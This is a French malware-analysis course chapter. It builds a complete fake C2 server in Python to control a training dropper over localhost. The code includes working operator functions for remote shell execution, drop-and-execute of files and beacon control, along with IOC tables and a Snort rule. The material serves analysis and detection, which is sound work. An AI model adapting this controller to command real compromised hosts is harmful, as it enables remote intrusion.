🔝 Retour au [Sommaire](/SOMMAIRE.md)

# 28.4 — Simuler un serveur C2 pour observer le comportement complet

> 📍 **Objectif** — Mettre en pratique tout ce qu'on a appris dans les sections précédentes en écrivant un **faux serveur C2** complet en Python. Ce serveur simulera l'infrastructure de commande et contrôle du dropper, nous permettant d'observer la totalité de son comportement : handshake, exécution de commandes, dépôt de fichiers, modification du rythme de beacon, et arrêt propre. C'est l'aboutissement de l'analyse : prendre le contrôle du malware sans disposer de son code source.

---

## Pourquoi simuler le C2 ?

Jusqu'ici, notre analyse a suivi une progression méthodique : observation passive avec `strace` et Wireshark (28.1), instrumentation active avec Frida (28.2), reconstruction formelle du protocole (28.3). Mais toutes ces étapes partageaient une limitation commune : on n'a jamais vu le dropper **exécuter réellement ses commandes** dans leur intégralité.

Le mini-C2 de la section 28.2 ne faisait qu'accepter la connexion, acquitter le handshake et envoyer un PING. Le dropper possède pourtant cinq commandes, dont deux particulièrement intéressantes (`CMD_EXEC` et `CMD_DROP`) que l'on n'a pas encore pu déclencher de manière contrôlée.

Simuler un serveur C2 complet permet de :

- **Exercer chaque commande** individuellement et observer la réaction exacte du dropper — taille de la réponse, encodage, codes de retour, effets de bord sur le système de fichiers.  
- **Valider la spécification du protocole** élaborée en 28.3. Si notre compréhension est correcte, le faux C2 fonctionnera du premier coup. Toute erreur de parsing ou d'encodage se manifestera immédiatement par un comportement inattendu.  
- **Découvrir des comportements cachés** — Certains chemins de code ne se révèlent que sous certaines séquences de commandes ou conditions d'erreur. Un C2 interactif permet d'explorer ces chemins.  
- **Produire des IOC comportementaux** — En observant le dropper exécuter ses commandes dans un environnement contrôlé, on documente précisément ses effets : quels fichiers il crée, quels processus il lance, quels appels système il effectue. Ces informations alimentent directement le rapport d'analyse (section 27.7).

Dans le monde réel, cette technique est appelée **C2 emulation** ou **sinkholing actif**. Elle est utilisée par les équipes de threat intelligence pour étudier des malwares dont l'infrastructure C2 a été démantelée ou est inaccessible.

---

## Architecture du faux C2

Notre serveur C2 sera un script Python unique qui implémente trois couches :

```
┌─────────────────────────────────────────────────┐
│           Couche 3 : Interface opérateur        │
│  Console interactive avec menu de commandes     │
│  L'analyste choisit quelle commande envoyer     │
├─────────────────────────────────────────────────┤
│           Couche 2 : Logique protocolaire       │
│  Encodage/décodage des messages                 │
│  XOR, construction des headers, validation      │
├─────────────────────────────────────────────────┤
│           Couche 1 : Transport TCP              │
│  Socket serveur, accept, send_all, recv_all     │
└─────────────────────────────────────────────────┘
```

Cette séparation en couches reflète la structure du protocole telle que reconstruite en 28.3, et rend le code extensible si l'on découvre de nouvelles commandes lors de l'analyse.

---

## Couche 1 — Transport TCP

La couche transport encapsule les opérations socket de bas niveau. Elle doit gérer les **envois et réceptions partiels** (le noyau ne garantit pas que `send()` ou `recv()` traitent la totalité du buffer en un seul appel), exactement comme le dropper le fait côté client.

```python
#!/usr/bin/env python3
"""
fake_c2.py — Faux serveur C2 pour l'analyse du dropper ELF (Chapitre 28)

⚠️  STRICTEMENT ÉDUCATIF — À exécuter UNIQUEMENT dans la VM sandboxée.
    Ce script simule un serveur de commande et contrôle pour observer
    le comportement complet du dropper sans infrastructure réelle.

Usage :
    Terminal 1 :  python3 fake_c2.py
    Terminal 2 :  ./dropper_O0        (ou via frida -f)
    Terminal 3 :  (optionnel) tcpdump / Wireshark

Licence MIT — Voir LICENSE à la racine du dépôt.
"""

import socket  
import struct  
import sys  
import os  
import time  
import select  
```

Les imports restent minimalistes — uniquement la bibliothèque standard Python, aucune dépendance externe. C'est un choix délibéré : dans un contexte d'analyse de malware, on veut un outil qui fonctionne immédiatement dans n'importe quel environnement, sans installation supplémentaire.

### Envoi et réception fiables

```python
def send_all(sock, data):
    """Envoie la totalité de `data` sur la socket, en gérant les envois partiels."""
    total_sent = 0
    while total_sent < len(data):
        sent = sock.send(data[total_sent:])
        if sent == 0:
            raise ConnectionError("Socket connection broken during send")
        total_sent += sent
    return total_sent


def recv_all(sock, length, timeout=30):
    """Reçoit exactement `length` octets, en gérant les réceptions partielles.
    
    Lève TimeoutError si aucune donnée n'arrive avant `timeout` secondes.
    Lève ConnectionError si la connexion est fermée avant d'avoir tout reçu.
    """
    chunks = []
    received = 0
    while received < length:
        ready, _, _ = select.select([sock], [], [], timeout)
        if not ready:
            raise TimeoutError(
                f"Timeout waiting for data ({received}/{length} bytes received)")
        chunk = sock.recv(length - received)
        if not chunk:
            raise ConnectionError(
                f"Connection closed ({received}/{length} bytes received)")
        chunks.append(chunk)
        received += len(chunk)
    return b"".join(chunks)
```

Le **timeout** est important en pratique : si le dropper crashe ou entre dans une boucle infinie, le C2 ne doit pas rester bloqué indéfiniment sur un `recv`. Le timeout de 30 secondes est largement suffisant pour un beacon dont l'intervalle par défaut est de 5 secondes.

---

## Couche 2 — Logique protocolaire

Cette couche implémente la spécification du protocole reconstruite en section 28.3. Chaque constante, chaque structure correspond exactement à ce que nous avons observé avec `strace`, Wireshark et Frida.

### Constantes du protocole

```python
# ─── Protocole ────────────────────────────────────────────────
PROTO_MAGIC    = 0xDE  
HEADER_SIZE    = 4       # magic(1) + type(1) + length(2)  
MAX_BODY_SIZE  = 4096  
XOR_KEY        = 0x5A  

# Commandes : Serveur → Client
CMD_PING       = 0x01  
CMD_EXEC       = 0x02  
CMD_DROP       = 0x03  
CMD_SLEEP      = 0x04  
CMD_EXIT       = 0x05  

# Messages : Client → Serveur
MSG_HANDSHAKE  = 0x10  
MSG_PONG       = 0x11  
MSG_RESULT     = 0x12  
MSG_ACK        = 0x13  
MSG_ERROR      = 0x14  
MSG_BEACON     = 0x15  

# Tables de nommage pour l'affichage
CMD_NAMES = {
    CMD_PING: "PING", CMD_EXEC: "EXEC", CMD_DROP: "DROP",
    CMD_SLEEP: "SLEEP", CMD_EXIT: "EXIT"
}
MSG_NAMES = {
    MSG_HANDSHAKE: "HANDSHAKE", MSG_PONG: "PONG", MSG_RESULT: "RESULT",
    MSG_ACK: "ACK", MSG_ERROR: "ERROR", MSG_BEACON: "BEACON"
}
ALL_NAMES = {**CMD_NAMES, **MSG_NAMES}
```

> 💡 **Point RE** — Toutes ces constantes ont été extraites du binaire au cours des sections précédentes. Les noms sont ceux que nous avons attribués dans Ghidra lors du renommage des symboles. Dans un vrai cas d'analyse, cette table serait construite progressivement au fil de la compréhension du protocole.

### Encodage et décodage XOR

```python
def xor_encode(data, key=XOR_KEY):
    """Applique un XOR mono-octet sur chaque byte du buffer.
    
    L'opération est sa propre inverse : xor_encode(xor_encode(data)) == data.
    Utilisé par le dropper pour encoder les commandes EXEC et DROP,
    ainsi que les résultats (MSG_RESULT).
    """
    return bytes(b ^ key for b in data)
```

L'implémentation est volontairement identique à celle du dropper : une boucle XOR octet par octet avec la clé `0x5A`. La propriété d'involution du XOR (`a ^ k ^ k == a`) signifie que la même fonction sert à encoder et à décoder.

### Construction et parsing des messages

```python
def build_message(msg_type, body=b""):
    """Construit un message protocolaire complet (header + body).
    
    Header format (4 octets, packed) :
      - magic  : uint8  = 0xDE
      - type   : uint8  = identifiant de commande/message
      - length : uint16 = taille du body en little-endian
    """
    if len(body) > MAX_BODY_SIZE:
        raise ValueError(f"Body too large: {len(body)} > {MAX_BODY_SIZE}")
    header = struct.pack("<BBH", PROTO_MAGIC, msg_type, len(body))
    return header + body


def recv_message(sock, timeout=30):
    """Reçoit et parse un message protocolaire complet.
    
    Retourne un tuple (msg_type, body) ou lève une exception.
    Valide le magic byte et la cohérence de la longueur.
    """
    header_raw = recv_all(sock, HEADER_SIZE, timeout)
    magic, msg_type, body_len = struct.unpack("<BBH", header_raw)

    if magic != PROTO_MAGIC:
        raise ValueError(
            f"Invalid magic byte: 0x{magic:02X} (expected 0x{PROTO_MAGIC:02X})")

    if body_len > MAX_BODY_SIZE:
        raise ValueError(f"Body length exceeds maximum: {body_len}")

    body = recv_all(sock, body_len, timeout) if body_len > 0 else b""
    return msg_type, body


def send_command(sock, cmd_type, body=b""):
    """Envoie une commande au dropper et affiche un résumé."""
    msg = build_message(cmd_type, body)
    send_all(sock, msg)
    name = ALL_NAMES.get(cmd_type, f"0x{cmd_type:02X}")
    print(f"  [>>>] Sent {name} | body={len(body)}B | total={len(msg)}B")
    if body:
        print(f"        body (hex): {body[:64].hex(' ')}"
              + (" ..." if len(body) > 64 else ""))
```

Le format `"<BBH"` de `struct.pack` correspond exactement au layout de `proto_header_t` dans le code C : un octet pour le magic, un octet pour le type, et un entier 16 bits non signé en little-endian pour la longueur. Le préfixe `<` force l'interprétation little-endian, ce qui correspond au comportement natif de x86-64 (le dropper n'effectue pas de conversion `htons` sur ce champ).

---

## Couche 3 — Interface opérateur

L'interface opérateur est la partie que l'analyste utilise directement. Elle offre deux modes de fonctionnement : un **mode interactif** (menu dans le terminal) et un **mode script** (séquence de commandes prédéfinies).

### Réception et affichage des messages du dropper

Avant de pouvoir envoyer des commandes, il faut savoir écouter. La fonction suivante reçoit un message du dropper et l'affiche de manière lisible, en décodant le XOR quand c'est approprié :

```python
def receive_and_display(sock, timeout=30):
    """Reçoit un message du dropper, le décode et l'affiche.
    
    Gère le décodage XOR automatique pour MSG_RESULT.
    Retourne le tuple (msg_type, body_decoded).
    """
    msg_type, body = recv_message(sock, timeout)
    name = ALL_NAMES.get(msg_type, f"0x{msg_type:02X}")

    print(f"  [<<<] Received {name} (0x{msg_type:02X}) | body={len(body)}B")

    if msg_type == MSG_HANDSHAKE:
        # Body = hostname\0 + pid\0 + version\0
        parts = body.split(b"\x00")
        parts = [p.decode("utf-8", errors="replace") for p in parts if p]
        if len(parts) >= 3:
            print(f"        hostname : {parts[0]}")
            print(f"        pid      : {parts[1]}")
            print(f"        version  : {parts[2]}")
        else:
            print(f"        raw parts: {parts}")

    elif msg_type == MSG_RESULT:
        # Body encodé en XOR — décoder pour afficher le résultat
        decoded = xor_encode(body)  # XOR est sa propre inverse
        text = decoded.decode("utf-8", errors="replace")
        print(f"        result (decoded): {text[:512]}"
              + (" [...]" if len(text) > 512 else ""))

    elif msg_type == MSG_BEACON:
        # Body = cmd_count(4) + timestamp(4), little-endian
        if len(body) >= 8:
            cmd_count, timestamp = struct.unpack("<II", body[:8])
            t_str = time.strftime("%Y-%m-%d %H:%M:%S",
                                  time.localtime(timestamp))
            print(f"        cmd_count : {cmd_count}")
            print(f"        timestamp : {t_str}")

    elif msg_type == MSG_ACK:
        text = body.decode("utf-8", errors="replace")
        print(f"        ack: {text}")

    elif msg_type == MSG_ERROR:
        text = body.decode("utf-8", errors="replace")
        print(f"        error: {text}")

    elif msg_type == MSG_PONG:
        print(f"        (no body)")

    else:
        if body:
            print(f"        body (hex): {body[:64].hex(' ')}")

    return msg_type, body
```

Chaque type de message est décodé selon sa structure spécifique :

- **HANDSHAKE** — Trois chaînes null-terminated concaténées. On les sépare et on les affiche nommément.  
- **RESULT** — Body encodé en XOR. On applique le décodage puis on affiche en texte (c'est la sortie d'une commande shell).  
- **BEACON** — Deux entiers 32 bits little-endian : compteur de commandes et timestamp Unix.  
- **ACK / ERROR** — Chaînes ASCII en clair.  
- **PONG** — Pas de body.

### Fonctions d'envoi de commandes

Chaque commande du protocole est encapsulée dans une fonction dédiée qui gère l'encodage et le formatage spécifiques :

```python
def cmd_ping(sock):
    """Envoie CMD_PING (0x01) et attend MSG_PONG."""
    print("\n── PING ──")
    send_command(sock, CMD_PING)
    return receive_and_display(sock)


def cmd_exec(sock, command_str):
    """Envoie CMD_EXEC (0x02) avec la commande shell encodée en XOR.
    
    Le dropper exécutera la commande via popen() et renverra
    la sortie dans un MSG_RESULT encodé en XOR.
    """
    print(f"\n── EXEC : {command_str} ──")
    encoded = xor_encode(command_str.encode("utf-8"))
    send_command(sock, CMD_EXEC, encoded)
    return receive_and_display(sock)


def cmd_drop(sock, filename, payload_data):
    """Envoie CMD_DROP (0x03) pour déposer un fichier sur la cible.
    
    Format du body (avant XOR) :
      [filename_len : 1 octet][filename][payload_data]
    
    Le dropper écrira le fichier dans /tmp/<filename>,
    le rendra exécutable (chmod 755), et l'exécutera.
    """
    print(f"\n── DROP : {filename} ({len(payload_data)} bytes) ──")

    fname_bytes = filename.encode("utf-8")
    if len(fname_bytes) > 255:
        print("  [!] Filename too long (max 255 bytes)")
        return None, None

    body = bytes([len(fname_bytes)]) + fname_bytes + payload_data
    encoded = xor_encode(body)
    send_command(sock, CMD_DROP, encoded)
    return receive_and_display(sock)


def cmd_sleep(sock, interval_seconds):
    """Envoie CMD_SLEEP (0x04) pour modifier l'intervalle de beacon.
    
    Le body contient le nouvel intervalle en secondes,
    encodé en little-endian sur 4 octets (non XOR).
    """
    print(f"\n── SLEEP : {interval_seconds}s ──")
    body = struct.pack("<I", interval_seconds)
    send_command(sock, CMD_SLEEP, body)
    return receive_and_display(sock)


def cmd_exit(sock):
    """Envoie CMD_EXIT (0x05) pour terminer proprement le dropper."""
    print("\n── EXIT ──")
    send_command(sock, CMD_EXIT)
    return receive_and_display(sock)
```

Chaque fonction reflète directement un handler du dropper. La symétrie entre le code C du dropper et le code Python du C2 n'est pas un hasard — elle découle de la spécification du protocole reconstruite en 28.3. Le faux C2 est littéralement le **miroir** du dropper.

> 💡 **Point RE** — Remarquez que `CMD_SLEEP` n'applique **pas** l'encodage XOR sur son body, contrairement à `CMD_EXEC` et `CMD_DROP`. Cette asymétrie a été observée en 28.2 via les hooks Frida sur `xor_encode` : la fonction n'est appelée que pour les commandes contenant des données textuelles (commandes shell, noms de fichiers). Les valeurs numériques (intervalle de sleep) sont transmises en clair. Ce genre de détail est facile à manquer en analyse statique seule, mais saute aux yeux lors de l'instrumentation dynamique.

### Phase de handshake côté serveur

```python
def handle_handshake(sock):
    """Attend le handshake du dropper et l'acquitte.
    
    C'est la première étape obligatoire de toute session.
    Le dropper n'acceptera aucune commande tant que le handshake
    n'a pas été acquitté par un MSG_ACK.
    
    Retourne les informations de la cible (hostname, pid, version).
    """
    print("═" * 60)
    print("  Waiting for handshake...")
    print("═" * 60)

    msg_type, body = receive_and_display(sock)

    if msg_type != MSG_HANDSHAKE:
        print(f"  [!] Expected HANDSHAKE (0x{MSG_HANDSHAKE:02X}), "
              f"got 0x{msg_type:02X}")
        return None

    # Acquitter le handshake
    ack_body = b"welcome"
    send_command(sock, MSG_ACK, ack_body)
    # Note : on envoie MSG_ACK (0x13), pas une commande CMD_*
    # Le dropper vérifie que le type de la réponse est bien MSG_ACK

    # Parser les informations de la cible
    parts = body.split(b"\x00")
    parts = [p.decode("utf-8", errors="replace") for p in parts if p]
    info = {
        "hostname": parts[0] if len(parts) > 0 else "?",
        "pid":      parts[1] if len(parts) > 1 else "?",
        "version":  parts[2] if len(parts) > 2 else "?"
    }

    print(f"\n  [+] Target registered: {info['hostname']} "
          f"(PID {info['pid']}, version {info['version']})")
    return info
```

L'envoi de `MSG_ACK` (`0x13`) en réponse au handshake est un point critique du protocole. Si on envoie autre chose (par exemple un `CMD_PING` directement), le dropper interprète cela comme un rejet et ferme la connexion. Ce comportement a été identifié en 28.1 quand le listener `nc` ne répondait rien et que le dropper restait bloqué indéfiniment sur `recv`.

### Gestion des beacons entrants

Entre deux commandes, le dropper envoie des **beacons** périodiques (`MSG_BEACON`, `0x15`). Le C2 doit les consommer pour éviter que le buffer de réception ne se remplisse et ne bloque les communications. La gestion des beacons s'intercale naturellement dans la boucle de commandes :

```python
def drain_beacons(sock, timeout=1):
    """Consomme les beacons en attente sans bloquer.
    
    Retourne la liste des beacons reçus.
    Utilise un timeout court pour ne pas bloquer si aucun
    beacon n'est en attente.
    """
    beacons = []
    while True:
        ready, _, _ = select.select([sock], [], [], timeout)
        if not ready:
            break
        try:
            msg_type, body = recv_message(sock, timeout=2)
            if msg_type == MSG_BEACON:
                if len(body) >= 8:
                    cmd_count, ts = struct.unpack("<II", body[:8])
                    beacons.append({"cmd_count": cmd_count, "timestamp": ts})
                    print(f"  [beacon] cmd_count={cmd_count} "
                          f"ts={time.strftime('%H:%M:%S', time.localtime(ts))}")
            else:
                # Message inattendu — l'afficher
                print(f"  [!] Unexpected message while draining: "
                      f"0x{msg_type:02X}")
        except (TimeoutError, ConnectionError):
            break
    return beacons
```

L'utilisation de `select()` avec un timeout court (1 seconde) permet de vérifier s'il y a des données en attente sans bloquer le programme. Si le dropper a un intervalle de beacon de 5 secondes, on ne restera jamais bloqué plus d'une seconde.

---

## Mode interactif — La console de l'analyste

Le mode interactif présente un menu à l'analyste et lui permet d'envoyer des commandes une par une, d'observer les réponses, et d'explorer le comportement du dropper à son rythme.

```python
def interactive_menu(sock, target_info):
    """Boucle interactive pour envoyer des commandes au dropper."""
    print("\n" + "═" * 60)
    print(f"  C2 Console — Target: {target_info['hostname']} "
          f"(PID {target_info['pid']})")
    print("═" * 60)

    while True:
        # Consommer les beacons en attente
        drain_beacons(sock, timeout=0.5)

        print("\n  Commands:")
        print("    1) PING          — keepalive")
        print("    2) EXEC <cmd>    — execute shell command")
        print("    3) DROP          — drop and execute a file")
        print("    4) SLEEP <sec>   — change beacon interval")
        print("    5) EXIT          — terminate dropper")
        print("    6) WAIT          — wait for next beacon")
        print("    0) QUIT          — close C2 (dropper stays alive)")

        try:
            choice = input("\n  c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  [*] Operator disconnected")
            break

        if not choice:
            continue

        try:
            if choice == "1":
                cmd_ping(sock)

            elif choice.startswith("2"):
                # "2 ls -la /tmp" ou juste "2" puis prompt
                parts = choice.split(None, 1)
                if len(parts) > 1:
                    command_str = parts[1]
                else:
                    command_str = input("  shell> ").strip()
                if command_str:
                    cmd_exec(sock, command_str)

            elif choice == "3":
                fname = input("  filename> ").strip() or "payload.sh"
                print("  Enter payload content (or press Enter for default):")
                user_payload = input("  payload> ").strip()
                if user_payload:
                    payload_data = user_payload.encode("utf-8")
                else:
                    # Payload par défaut : script shell inoffensif
                    payload_data = (
                        b"#!/bin/sh\n"
                        b"echo '[payload] Hello from dropped file'\n"
                        b"echo '[payload] Hostname:' $(hostname)\n"
                        b"echo '[payload] Date:' $(date)\n"
                        b"echo '[payload] Execution complete'\n"
                    )
                cmd_drop(sock, fname, payload_data)

            elif choice.startswith("4"):
                parts = choice.split(None, 1)
                if len(parts) > 1:
                    interval = int(parts[1])
                else:
                    interval = int(input("  interval (seconds)> ").strip())
                cmd_sleep(sock, interval)

            elif choice == "5":
                cmd_exit(sock)
                print("\n  [*] Dropper terminated. Exiting C2.")
                break

            elif choice == "6":
                print("  [*] Waiting for beacon...")
                receive_and_display(sock, timeout=60)

            elif choice == "0":
                print("  [*] Closing C2 connection (dropper will retry)")
                break

            else:
                print(f"  [?] Unknown command: {choice}")

        except (ConnectionError, BrokenPipeError) as e:
            print(f"\n  [!] Connection lost: {e}")
            break
        except TimeoutError as e:
            print(f"\n  [!] Timeout: {e}")
            print("  [*] The dropper may have crashed or disconnected.")
            break
```

Le menu offre quelques choix qui ne correspondent pas directement à des commandes du protocole :

- **WAIT** (choix 6) — Attend passivement le prochain beacon. Utile pour observer le comportement idle du dropper et vérifier l'intervalle de beacon.  
- **QUIT** (choix 0) — Ferme la connexion côté C2 sans envoyer `CMD_EXIT`. Le dropper détectera la rupture de connexion et tentera de se reconnecter. C'est un bon test de robustesse du mécanisme de reconnexion.

### Point d'entrée principal

```python
def main():
    """Point d'entrée : écoute, accepte la connexion, gère la session."""
    host = "127.0.0.1"
    port = 4444

    print("╔══════════════════════════════════════════════════════╗")
    print("║  Fake C2 Server — Chapter 28 (Educational Only)      ║")
    print("║  ⚠️  Run ONLY in sandboxed VM                        ║")
    print("╚══════════════════════════════════════════════════════╝")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(1)
        print(f"\n  [*] Listening on {host}:{port}")
        print("  [*] Waiting for dropper connection...\n")

        try:
            conn, addr = srv.accept()
        except KeyboardInterrupt:
            print("\n  [*] Server stopped by operator")
            return

        with conn:
            print(f"  [+] Connection from {addr[0]}:{addr[1]}")

            # Phase 1 : Handshake
            target_info = handle_handshake(conn)
            if target_info is None:
                print("  [!] Handshake failed, closing connection")
                return

            # Phase 2 : Boucle interactive
            interactive_menu(conn, target_info)

    print("\n  [*] C2 server shut down")


if __name__ == "__main__":
    main()
```

---

## Mode script — Séquences automatisées

Le mode interactif est idéal pour l'exploration, mais il est lent et non reproductible. Pour des analyses systématiques, on peut piloter le C2 depuis un script qui enchaîne les commandes automatiquement.

L'idée est d'extraire la logique protocolaire dans un module réutilisable et d'écrire des scénarios sous forme de fonctions :

```python
def scenario_full_exercise(sock, target_info):
    """Scénario automatisé qui exerce toutes les commandes du dropper.
    
    Ce scénario est conçu pour être lancé en parallèle avec Frida
    et/ou Wireshark afin de capturer le comportement complet.
    """
    print("\n  [*] Running full exercise scenario...")

    # 1. PING — vérifier la connectivité
    cmd_ping(sock)
    time.sleep(0.5)

    # 2. EXEC — commande simple
    cmd_exec(sock, "id")
    time.sleep(0.5)

    # 3. EXEC — commande avec sortie plus volumineuse
    cmd_exec(sock, "ls -la /tmp/")
    time.sleep(0.5)

    # 4. EXEC — commande qui produit du contenu multiligne
    cmd_exec(sock, "cat /etc/hostname")
    time.sleep(0.5)

    # 5. SLEEP — réduire l'intervalle de beacon à 2 secondes
    cmd_sleep(sock, 2)
    time.sleep(0.5)

    # 6. Attendre un beacon pour vérifier le nouvel intervalle
    print("\n  [*] Waiting for beacon with new interval...")
    receive_and_display(sock, timeout=10)

    # 7. DROP — déposer un script shell inoffensif
    payload = (
        b"#!/bin/sh\n"
        b"echo 'DROP_TEST: payload executed successfully'\n"
        b"echo 'DROP_TEST: running as' $(whoami)\n"
        b"echo 'DROP_TEST: in directory' $(pwd)\n"
    )
    cmd_drop(sock, "test_payload.sh", payload)
    time.sleep(0.5)

    # 8. EXEC — vérifier que le fichier a été déposé
    cmd_exec(sock, "ls -la /tmp/test_payload.sh")
    time.sleep(0.5)

    # 9. SLEEP — remettre l'intervalle par défaut
    cmd_sleep(sock, 5)
    time.sleep(0.5)

    # 10. EXIT — terminer proprement
    cmd_exit(sock)

    print("\n  [+] Scenario complete")
```

Ce scénario exerce les cinq commandes dans un ordre logique et vérifie les effets de bord (le fichier a-t-il été créé ? le nouvel intervalle est-il respecté ?). Lancé en parallèle avec `hook_network.js` (section 28.2) et `tcpdump`, il génère une capture complète et annotée de l'ensemble du protocole.

Pour utiliser ce mode, on remplace l'appel à `interactive_menu` dans `main()` :

```python
# Dans main(), après le handshake réussi :
# interactive_menu(conn, target_info)      # mode interactif
scenario_full_exercise(conn, target_info)   # mode script
```

---

## Observer le comportement complet : combiner C2 + Frida + Wireshark

La configuration optimale pour une observation exhaustive mobilise **quatre terminaux** simultanés :

```
┌──────────────────────────────────────────────────────┐
│  Terminal 1 :  sudo tcpdump -i lo -w full.pcap       │
│                port 4444                             │
│  → Capture réseau brute pour archivage               │
├──────────────────────────────────────────────────────┤
│  Terminal 2 :  python3 fake_c2.py                    │
│  → Notre faux C2 en mode interactif ou script        │
├──────────────────────────────────────────────────────┤
│  Terminal 3 :  frida -l hook_network.js              │
│                -f ./dropper_O0 --no-pause            │
│  → Instrumentation Frida (hooks send/recv/connect)   │
├──────────────────────────────────────────────────────┤
│  Terminal 4 :  (observation)                         │
│  tail -f /tmp/test_payload.sh                        │
│  → Vérifier les fichiers déposés par CMD_DROP        │
└──────────────────────────────────────────────────────┘
```

Avec cette configuration, chaque commande envoyée depuis le C2 est observable à **quatre niveaux** :

1. **fake_c2.py** — Affiche la commande envoyée, la réponse reçue et décodée.  
2. **Frida** — Montre les buffers `send()` et `recv()` bruts et décodés, côté dropper.  
3. **tcpdump/Wireshark** — Capture les paquets TCP avec les payloads binaires du protocole.  
4. **Système de fichiers** — Les fichiers déposés dans `/tmp/` sont visibles immédiatement.

Cette quadruple observation croisée est la meilleure façon de valider la compréhension du protocole : si les quatre sources concordent, l'analyse est correcte.

---

## Scénarios d'analyse intéressants

Au-delà de l'exercice systématique de chaque commande, le faux C2 permet d'explorer des **cas limites** qui révèlent des comportements subtils du dropper.

### Tester les limites du buffer

Que se passe-t-il si on envoie une commande `CMD_EXEC` avec un body de 4096 octets (la taille maximale) ? Et avec 4097 ? Le dropper vérifie-t-il la longueur avant de décoder ? Un buffer overflow est-il possible ? Ces questions sont directement liées à la sécurité du dropper lui-même — et par extension, à la possibilité de **retourner le malware contre son opérateur**.

```python
# Test : commande de taille maximale
long_cmd = "A" * 4090  
cmd_exec(sock, long_cmd)  # Le dropper va tenter d'exécuter "AAAA...A"  
```

### Envoyer un type de commande invalide

Le handler `dispatch_command` du dropper contient un cas `default` qui renvoie `MSG_ERROR` avec le body `"unknown_cmd"`. On peut le vérifier :

```python
# Envoyer un type de commande inexistant (0xFF)
send_command(sock, 0xFF, b"test")  
msg_type, body = receive_and_display(sock)  
# Attendu : MSG_ERROR (0x14) avec body "unknown_cmd"
```

### Fermer la connexion brutalement

Si le C2 ferme la socket sans envoyer `CMD_EXIT`, le dropper détecte la déconnexion (via `recv` retournant 0 ou une erreur), ferme sa socket, attend `BEACON_INTERVAL` secondes, et tente de se reconnecter. Observer ce cycle de reconnexion est important pour comprendre la **résilience** du dropper — un vrai malware pourrait avoir un mécanisme plus sophistiqué (domaines de fallback, génération dynamique d'adresses C2 via DGA).

### Envoyer des commandes pendant un beacon

Le dropper utilise `select()` avec un timeout pour alterner entre l'envoi de beacons et la réception de commandes. Que se passe-t-il si on envoie une commande **exactement pendant** que le dropper est en train de construire un beacon ? Le `select()` devrait détecter les données entrantes et prioriser la réception. Ce test valide le bon fonctionnement du multiplexage.

---

## De l'analyse au rapport

Le faux C2, combiné aux captures Frida et Wireshark, fournit toutes les données nécessaires pour rédiger un **rapport d'analyse complet** (comparable à celui du [Chapitre 27, section 27.7](/27-ransomware/07-rapport-analyse.md)). Voici les éléments que cette phase apporte au rapport :

### IOC (Indicators of Compromise)

| Type | Valeur | Source |  
|---|---|---|  
| IP de destination | `127.0.0.1` | `strace` connect, Frida hook, pcap |  
| Port TCP | `4444` | Idem |  
| Magic byte | `0xDE` | Header protocolaire, pcap |  
| Clé XOR | `0x5A` | Frida hook sur `xor_encode`, analyse statique |  
| Version string | `DRP-1.0` | Handshake body, `strings` |  
| Drop directory | `/tmp/` | Frida hook, `strace` open/write |

### Comportement documenté

| Capacité | Commande | Observations |  
|---|---|---|  
| Exécution de commandes shell | `CMD_EXEC (0x02)` | Via `popen()`, sortie renvoyée encodée XOR |  
| Dépôt de fichiers | `CMD_DROP (0x03)` | Écriture dans `/tmp/`, `chmod 755`, `system()` |  
| Persistance de la connexion | `CMD_SLEEP (0x04)` | Intervalle de beacon modifiable (1–3600s) |  
| Terminaison propre | `CMD_EXIT (0x05)` | Fermeture de socket, arrêt du processus |  
| Reconnexion automatique | (comportement interne) | 3 tentatives max, intervalle = beacon interval |  
| Beacons périodiques | `MSG_BEACON (0x15)` | Contient cmd_count et timestamp |

### Règles de détection réseau

La capture pcap produite pendant cette phase permet d'écrire des règles de détection (Snort, Suricata, Zeek). Le magic byte `0xDE` en première position de chaque message applicatif est un indicateur fiable :

```
alert tcp any any -> any 4444 (msg:"Dropper C2 communication detected";
    content:"|DE|"; offset:0; depth:1;
    metadata:author training,severity high;
    sid:1000001; rev:1;)
```

> 💡 **Point RE** — Cette règle est volontairement simpliste pour le contexte pédagogique. En production, on affinerait avec des critères supplémentaires (taille du header, valeurs de type attendues, fréquence de connexion) pour réduire les faux positifs. Un seul octet `0xDE` au début d'un flux TCP est un critère beaucoup trop large pour un réseau réel.

---

## Résumé : le faux C2 comme outil de validation

Le script `fake_c2.py` est bien plus qu'un simple outil de test — c'est la **preuve opérationnelle** que notre analyse est complète et correcte. Si le faux C2 peut piloter le dropper à travers l'intégralité de ses fonctionnalités, cela signifie que :

1. La **spécification du protocole** (section 28.3) est exacte — format des headers, encodage XOR, types de messages, machine à états.  
2. Chaque **handler de commande** a été compris et peut être déclenché de manière contrôlée.  
3. Les **IOC** extraits sont suffisants pour détecter cette menace en environnement réel.  
4. Un **déchiffreur** ou un outil de mitigation pourrait être écrit sur la base de cette analyse.

Le tableau ci-dessous résume la progression sur l'ensemble du chapitre :

| Section | Approche | Ce qu'on apprend |  
|---|---|---|  
| 28.1 | Observation passive (strace + Wireshark) | IP, port, transport, premier message, structure du header |  
| 28.2 | Instrumentation active (Frida) | Contenu des buffers, décodage XOR, machine à états interne |  
| 28.3 | Formalisation (spécification du protocole) | Format complet, diagramme de séquence, table des commandes |  
| 28.4 | Simulation (faux C2) | Validation exhaustive, comportement complet, IOC, rapport |

Chaque section a construit sur la précédente, et le faux C2 est l'aboutissement qui prouve que toute la chaîne d'analyse tient debout.

---

> **À suivre** — Le **checkpoint** du chapitre vous demandera de produire un faux C2 complet et fonctionnel capable de piloter la variante `dropper_O2_strip` à travers les cinq commandes, en capturant l'intégralité de la session dans un fichier pcap accompagné d'un rapport d'analyse structuré.

⏭️ [🎯 Checkpoint : écrire un faux serveur C2 qui contrôle le dropper](/28-dropper/checkpoint.md)
